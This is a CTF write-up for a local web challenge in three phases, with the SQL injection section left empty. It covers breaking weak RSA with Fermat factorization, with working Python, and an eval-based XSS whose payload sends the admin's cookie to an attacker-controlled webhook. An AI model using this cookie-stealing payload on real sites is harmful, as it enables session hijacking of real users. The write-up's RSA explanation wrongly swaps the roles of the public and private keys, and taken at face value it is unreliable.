## Introduction

This challenge is the hardest on this LOCAL-CTF competition in the web category. It is a bit different since it mixes 3 vulnrebalities and has 1 bug bounty scenario.

The challenge is composed of 3 phases

1. SQLI Phase
2. Weak RSA Phase
3. XSS + cookie hijacking phase


## SQLI Phase




## Weak RSA Phase

In this phase you need to decrypt the ciphered key and put it within the url like this `URL/phaseTwo/challenge?data=key` to move to the next challenge.

### Explaining RSA

So we all know that RSA is an assymetric encryption that uses a public key to decrypt and a private key to encrypt and each key is a pair of two numbers with the public key being `(n, e)` and the private key being `(n, d)`.

To ecnrypt a message *m* into a crypted text *c* RSA  uses arithmetic operations with the private key like this:

`c = m^d mod (n)`

and to decrypt that message we use

`m = c^e mod (n)` 

So basically both keys can be used to encrypt and decrypt the other. What we apply the private key on is deapplied with the public key and in reverse.

**What is n**

When we perform RSA we realize that the two keys have a common number which is n.

n is the product of two prime numbers p and q and these two numbers are the key to any RSA encryption.

`n = p*q`

They are the key for RSA encryption because both e and d are generated with p and q by caluclating `φ(n)`

```
φ(n) = (p-1)*(q-1)
```

and e is a number that respects the following conditions:

1. GCD(e, φ(n)) = 1
2. 1 < e < φ(n)

and ` d*e = 1 mod (φ(n))`

We can extract d by just knowing φ(n) and how do we know φ(n) by knowing p and q and we can get those by factoring n.

### Breaking RSA

RSA can be vulnerable if the difference between p and q is small enough like `∣p−q∣≤2^20 or 2^30`. Then n can be factored using **Fermat’s Factorization Method**. For more about this method you can check [ComputerPhile's video on breaking RSA](https://www.youtube.com/watch?v=-ShwJqAalOk).

The implimentation of this method in python is the following code:

```py

import math

def fermat_factor(n):
    """
    Fermat factorization.
    Works best when p and q are close.
    Returns (p, q) or None if not found.
    """
    if n % 2 == 0:
        return (2, n // 2)

    a = math.isqrt(n)
    if a * a < n:
        a += 1

    while True:
        b2 = a * a - n
        b = math.isqrt(b2)

        if b * b == b2:
            p = a - b
            q = a + b
            return (p, q)

        a += 1


```

when we run this code we indeed get `p=14995773187437401993` and `q=14995773187437419803` and with that

`φ(n) = 224873213489066766171059765770735045584` and with that we can extract d and decrypt the message.

We can use various mathimatical methods, and to not turn this writeup into numbertheory/arithmetic course I'm going to just give you the code that will get you d using bezout's identity. For more theory about bezout's identity you can check [This video](https://www.youtube.com/watch?v=7I92alYuF2M).

```py
def bezout(a, b):
    """
    Returns (g, x, y) such that:
    a*x + b*y = g = gcd(a, b)
    """
    if b == 0:
        return a, 1, 0

    g, x1, y1 = bezout(b, a % b)
    x = y1
    y = x1 - (a // b) * y1

    return g, x, y

e = 65537
phi = 224873213489066766171059765770735045584

g, x, y = bezout(e, phi)

if g != 1:
    raise Exception("No modular inverse")

d = x % phi
print("d =", d)
```

With that we get `d=63937736853308362006676040639209558561` and we can decrypt the message.

`m = 137471969341297124072353953258472172494^d mod (n)`

```py
n = 14995773187437401993 * 14995773187437419803
c = 137471969341297124072353953258472172494
d = 63937736853308362006676040639209558561

# Decrypt
m = pow(c, d, n)
```
and we get the message m=116221439726562114721266306538092655970 and we need to convert it to string.


```py
def int_to_string(x: int) -> str:
    length = (x.bit_length() + 7) // 8
    return x.to_bytes(length, byteorder="big").decode(errors="ignore")

flag = int_to_string(m)
print(flag)
```

and we get the final string which is `WoobaloobaDubDub`. Yep all of this hustle so the password is that.


Now all we need is to add it to the path to move to the next and final stronghold.

`www.bruh.com/phaseTwo/challenge?key=WoobaloobaDubDub`


## XSS and Cookie Hijacking

This is the last phase and it is basically a simulation of cookie hijacking operation using XSS.

### Investigation

The last page is a search bar and some articles and posts and there are some hints that you can extract and some tools provided for you and features.

### App components

The app has four main components

1. Search page `/thirdphase`
2. Messaging Admin Page `/thirdphase/admin/message`
3. Listener (Webhook) `/thirdphase/listener`
4. Endpoint to store data within your webhook `/thirdphase/store/<YourAccountName>?data=<dataYouWantToStore>`
5. Login page and register for the webhook so each user has his own webhook `/thirdphase/login` and `/thirdphase/register`

### What is a webhook

An HTTP endpoint you control that receives requests when something happens somewhere else.


### Discovering XSS vulnerability

When you try to search for a specific item you get posts that match your search. And to better check the code source of how this is working let's open burpsuite and see the target tab after making a search.

After making the search we can check the target tab on burpsuite we can see search file is being sent within the response we can see the javascript of the search functionality.

```js
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText); // HERE
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();
```

We can see that this function has a suspicious instruction which is eval. That function executes strings as JS code and this can be dangerous if misued.

the eval function assigns the responseText to a variable named `searchResultsObj` but what does the this.responseText contain.

When we check the target tab within burpsuite you can find this as a response

```js
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"results":[],"searchTerm":"faculty"}
```

Here we can find that the response text is JS object that contains two params the results of your search which is a list and the searchterm you entered and all of this is inside an eval like this

```js
eval('var searchResultsObj = ' + {"results":[],"searchTerm":"faculty"});
```

So if we enter a payload like this `"};alert(1);` we can escape the object and run an alert. But then we discover that double quotes are sanatized so it becomes `{"results":[],"searchTerm":"\"};alert(1);"}` so we can add backslash to escape this sanatization. like this `\"};alert(1);//\"1` we added the the comment and backslash because there is a left double quote so to not mess the syntax of js and so the function runs properly all of that becomes `{"results":[],"searchTerm":"\"}; alert(1);//\"1"`

And with that the alert fires and we found the XSS.

### Exploiting the XSS and getting the flag

So XSS should be exploited by not just typing an alert. The goal of the challenge is to send malicious search url to an admin so we can hijack his cookies.

After creating an account in the listener (Webhook) that is where the cookies are going to get sent. So let's craft a malicious url by searching `"};fetch('/thirdphase/store/<name>?data='+document.cookie);//\"1` and with that we can get the url of this search result and send it to the admin on /thirdphase/admin/message. And after some time the admin will eventually open the link and we can get the cookie and we got it which is the flag.


## Conclusion
This challenge was designed to emphasize one core idea: real-world exploitation is rarely about a single vulnerability. Instead, meaningful compromise often comes from chaining small mistakes across different layers of an application.
